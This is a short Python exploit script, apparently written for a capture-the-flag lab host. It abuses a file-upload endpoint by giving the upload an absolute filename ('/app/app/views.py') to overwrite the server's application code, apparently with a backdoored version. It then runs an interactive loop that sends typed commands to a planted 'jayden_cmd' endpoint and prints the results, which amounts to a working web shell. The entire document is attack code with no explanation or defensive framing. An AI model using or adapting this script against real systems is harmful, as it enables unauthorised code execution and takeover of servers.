import requests

headers = {
    'Host': '10.10.11.164',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    # 'Accept-Encoding': 'gzip, deflate',
    # 'Content-Length': '1279',
    'Origin': 'http://10.10.11.164',
    'DNT': '1',
    'Connection': 'close',
    'Referer': 'http://10.10.11.164/upcloud',
    'Upgrade-Insecure-Requests': '1',
    'Pragma': 'no-cache',
    'Cache-Control': 'no-cache',
}

files = {'file' : ("/app/app/views.py", open('views.py', 'rb').read())}

response = requests.post('http://10.10.11.164/upcloud', headers=headers, files=files, verify=False)

while 1:
    cmd = input("CMD> ")
    response = requests.get('http://10.10.11.164/jayden_cmd?cmd=' + cmd, verify=False)
    
    if 'No such file or directory:' in response.text:
        print("ERROR")
    
    print(response.text)